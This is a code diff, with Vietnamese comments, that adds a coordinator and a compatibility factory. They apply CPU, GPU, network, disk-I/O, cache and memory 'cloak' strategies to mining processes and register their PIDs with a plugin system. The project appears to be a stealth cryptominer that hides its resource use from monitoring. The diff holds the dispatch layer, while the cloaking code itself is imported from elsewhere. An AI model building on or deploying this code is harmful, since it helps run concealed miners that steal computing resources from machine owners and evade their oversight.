@@ -2244,3 +2244,258 @@ class ResourceControlFactory:
         except Exception as e:
             self.logger.debug(f"Lỗi khi áp dụng rlimits: {e}")
             # Lỗi không quan trọng, phương thức này chỉ là biện pháp dự phòng
+
+###############################################################################
+#                           RESOURCE COORDINATOR                              #
+###############################################################################
+
+class ResourceCoordinator:
+    """
+    Điều phối viên trung tâm cho tất cả chiến lược theo blueprint redesign.
+    Phân biệt giữa direct execution và plugin delegation.
+    """
+    
+    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
+        """
+        Khởi tạo ResourceCoordinator.
+        
+        :param config: Cấu hình hệ thống
+        :param logger: Logger để ghi log
+        """
+        self.config = config
+        self.logger = logger
+        self.resource_managers = {}
+        
+        # Import strategies
+        from .cloak_strategies import (
+            CpuCloakStrategy, GpuCloakStrategy, NetworkCloakStrategy,
+            DiskIoCloakStrategy, CacheCloakStrategy, MemoryCloakStrategy,
+            StrategyType
+        )
+        
+        # Khởi tạo resource managers
+        try:
+            self.resource_managers = ResourceControlFactory.create_resource_managers(config, logger)
+            self.logger.info("✅ ResourceCoordinator khởi tạo resource managers thành công")
+        except Exception as e:
+            self.logger.error(f"❌ Lỗi khởi tạo resource managers: {e}")
+            raise
+        
+        # Khởi tạo strategies
+        self.strategies = {
+            StrategyType.CPU: CpuCloakStrategy(config, logger, self.resource_managers.get('cpu')),
+            StrategyType.GPU: GpuCloakStrategy(config, logger, self.resource_managers.get('gpu')),
+            StrategyType.NETWORK: NetworkCloakStrategy(config, logger, self.resource_managers.get('network')),
+            StrategyType.DISK_IO: DiskIoCloakStrategy(config, logger, self.resource_managers.get('disk_io')),
+            StrategyType.CACHE: CacheCloakStrategy(config, logger, self.resource_managers.get('cache')),
+            StrategyType.MEMORY: MemoryCloakStrategy(config, logger, self.resource_managers.get('memory'), self.resource_managers.get('cache'))
+        }
+        
+        self.logger.info("✅ ResourceCoordinator khởi tạo 6 unified strategies thành công")
+    
+    def apply_strategy(self, strategy_type: str, process: Any) -> bool:
+        """
+        Áp dụng một chiến lược cụ thể cho một tiến trình.
+        
+        :param strategy_type: Loại chiến lược cần áp dụng
+        :param process: Đối tượng MiningProcess cần áp dụng chiến lược
+        :return: True nếu áp dụng thành công, False nếu thất bại
+        """
+        try:
+            strategy = self.strategies.get(strategy_type)
+            if not strategy:
+                self.logger.error(f"❌ Không tìm thấy strategy: {strategy_type}")
+                return False
+            
+            # Phân biệt giữa direct execution và plugin delegation
+            if strategy.requires_plugin_system:
+                return self._delegate_to_plugin(strategy_type, strategy, process)
+            else:
+                return self._direct_execute(strategy_type, strategy, process)
+                
+        except Exception as e:
+            self.logger.error(f"❌ Lỗi áp dụng strategy {strategy_type}: {e}")
+            return False
+    
+    def apply_strategies(self, process: Any) -> Dict[str, bool]:
+        """
+        Áp dụng tất cả chiến lược phù hợp cho một tiến trình.
+        
+        :param process: Đối tượng MiningProcess cần áp dụng chiến lược
+        :return: Dictionary chứa kết quả áp dụng từng chiến lược
+        """
+        results = {}
+        
+        # Xác định loại tiến trình
+        is_gpu = hasattr(process, "is_gpu_process") and callable(getattr(process, "is_gpu_process")) and process.is_gpu_process()
+        
+        # Áp dụng chiến lược phù hợp
+        if is_gpu:
+            # GPU process: áp dụng GPU + các chiến lược chung
+            strategies_to_apply = [
+                StrategyType.GPU,
+                StrategyType.NETWORK,
+                StrategyType.DISK_IO,
+                StrategyType.CACHE,
+                StrategyType.MEMORY
+            ]
+        else:
+            # CPU process: áp dụng CPU + các chiến lược chung
+            strategies_to_apply = [
+                StrategyType.CPU,
+                StrategyType.NETWORK,
+                StrategyType.DISK_IO,
+                StrategyType.CACHE,
+                StrategyType.MEMORY
+            ]
+        
+        for strategy_type in strategies_to_apply:
+            results[strategy_type] = self.apply_strategy(strategy_type, process)
+        
+        return results
+    
+    def _direct_execute(self, strategy_type: str, strategy: Any, process: Any) -> bool:
+        """
+        Thực thi trực tiếp một chiến lược.
+        
+        :param strategy_type: Loại chiến lược
+        :param strategy: Đối tượng chiến lược
+        :param process: Đối tượng MiningProcess
+        :return: True nếu thực thi thành công, False nếu thất bại
+        """
+        try:
+            self.logger.info(f"🔧 Direct execute strategy: {strategy_type} cho PID={process.pid}")
+            strategy.apply(process)
+            self.logger.info(f"✅ Direct execute thành công: {strategy_type} cho PID={process.pid}")
+            return True
+        except Exception as e:
+            self.logger.error(f"❌ Lỗi direct execute {strategy_type}: {e}")
+            return False
+    
+    def _delegate_to_plugin(self, strategy_type: str, strategy: Any, process: Any) -> bool:
+        """
+        Ủy quyền thực thi cho plugin system.
+        
+        :param strategy_type: Loại chiến lược
+        :param strategy: Đối tượng chiến lược
+        :param process: Đối tượng MiningProcess
+        :return: True nếu ủy quyền thành công, False nếu thất bại
+        """
+        try:
+            self.logger.debug(f"🔄 Ủy quyền chiến lược {strategy_type} cho plugin system")
+            
+            # CPU plugin delegation
+            if strategy_type == StrategyType.CPU:
+                cpu_manager = self.resource_managers.get('cpu')
+                if not cpu_manager:
+                    self.logger.error("❌ Không tìm thấy CPU resource manager")
+                    return False
+                    
+                # Đăng ký PID với plugin system
+                cpu_manager.register_pid(process.pid)
+                
+                # Apply strategy thông qua plugin system
+                strategy.apply(process)
+                
+                self.logger.info(f"✅ Đã ủy quyền chiến lược CPU cho plugin system, PID={process.pid}")
+                return True
+                
+            # GPU plugin delegation
+            elif strategy_type == StrategyType.GPU:
+                gpu_manager = self.resource_managers.get('gpu')
+                if not gpu_manager:
+                    self.logger.error("❌ Không tìm thấy GPU resource manager")
+                    return False
+                
+                # Apply strategy thông qua plugin system
+                strategy.apply(process)
+                
+                self.logger.info(f"✅ Đã ủy quyền chiến lược GPU cho plugin system, PID={process.pid}")
+                return True
+            
+            self.logger.warning(f"⚠️ Không hỗ trợ ủy quyền cho plugin system với chiến lược {strategy_type}")
+            return False
+            
+        except Exception as e:
+            self.logger.error(f"❌ Lỗi khi ủy quyền chiến lược {strategy_type} cho plugin system: {e}")
+            return False
+
+###############################################################################
+#                          BACKWARD COMPATIBILITY                             #
+###############################################################################
+
+class CloakStrategyFactory:
+    """
+    Wrapper factory để đảm bảo tương thích ngược với codebase hiện tại.
+    Thực ra chỉ là proxy đến ResourceCoordinator theo blueprint.
+    """
+    
+    _coordinator_instances = {}
+    
+    @staticmethod
+    def create_strategy(
+        strategy_name: str,
+        config: Dict[str, Any],
+        logger: logging.Logger,
+        resource_managers: Dict[str, Any]
+    ) -> Optional[Any]:
+        """
+        Tạo một strategy instance. Wrapper cho tương thích ngược.
+        
+        :param strategy_name: Tên chiến lược
+        :param config: Cấu hình
+        :param logger: Logger
+        :param resource_managers: Resource managers
+        :return: Strategy instance hoặc None
+        """
+        # Tạo hoặc lấy ResourceCoordinator instance
+        coordinator_key = id(config)
+        if coordinator_key not in CloakStrategyFactory._coordinator_instances:
+            coordinator = ResourceCoordinator(config, logger)
+            CloakStrategyFactory._coordinator_instances[coordinator_key] = coordinator
+        else:
+            coordinator = CloakStrategyFactory._coordinator_instances[coordinator_key]
+        
+        # Import StrategyType
+        from .cloak_strategies import StrategyType
+        
+        # Map strategy name cũ sang StrategyType mới
+        strategy_mapping = {
+            'cpu': StrategyType.CPU,
+            'gpu': StrategyType.GPU,
+            'network': StrategyType.NETWORK,
+            'disk_io': StrategyType.DISK_IO,
+            'cache': StrategyType.CACHE,
+            'memory': StrategyType.MEMORY,
+            'cpu_cloaking': StrategyType.CPU,
+            'gpu_cloaking': StrategyType.GPU,
+            'network_cloaking': StrategyType.NETWORK,
+            'disk_io_cloaking': StrategyType.DISK_IO,
+            'cache_cloaking': StrategyType.CACHE,
+            'memory_cloaking': StrategyType.MEMORY
+        }
+        
+        if strategy_name in strategy_mapping:
+            mapped_name = strategy_mapping[strategy_name]
+            return coordinator.strategies.get(mapped_name)
+        
+        # Thử tìm trực tiếp
+        return coordinator.strategies.get(strategy_name)
+    
+    @staticmethod
+    def get_available_strategies() -> List[str]:
+        """
+        Lấy danh sách strategies có sẵn cho tương thích ngược.
+        
+        :return: List các strategy names
+        """
+        from .cloak_strategies import StrategyType
+        
+        return [
+            StrategyType.CPU,
+            StrategyType.GPU,
+            StrategyType.NETWORK,
+            StrategyType.DISK_IO,
+            StrategyType.CACHE,
+            StrategyType.MEMORY
+        ]
